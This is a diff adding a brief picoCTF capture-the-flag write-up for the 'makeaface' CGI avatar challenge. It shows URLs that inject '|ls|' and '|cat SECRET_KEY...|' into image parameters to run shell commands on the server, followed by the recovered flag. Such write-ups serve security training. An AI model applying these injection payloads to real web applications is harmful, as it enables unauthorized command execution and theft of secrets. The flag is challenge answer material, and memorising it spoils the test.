@@ -1,0 +1,18 @@
+Problem:
+
+It looks like Daedalus is working on a new project to generate digital avatars for use online. After taking a look, at their site: http://makeaface.picoctf.com/ it seems like there is a pretty good chance the project isn't completed, and may have some bugs. This might be the break we've been looking for to get inside their network.
+
+Notes:
+
+
+http://makeaface.picoctf.com/index.cgi?Head=2.bmp&Hair=1.bmp&Nose=2.bmp&Mouth=2.bmp&Eyes=2.bmp
+
+http://makeaface.picoctf.com/index.cgi?Head=2.bmp|ls|&Hair=1.bmp|ls|&Nose=2.bmp|ls|&Mouth=2.bmp|ls|&Eyes=2.bmp|ls|
+
+
+http://makeaface.picoctf.com/index.cgi?Head=2.bmp|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Hair=1.bmp|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Nose=2.bmp|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Mouth=2.bmp|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|&Eyes=2.bmp|cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8|
+
+Flag:
+
+why_did_we_stop_using_perl_again?
+
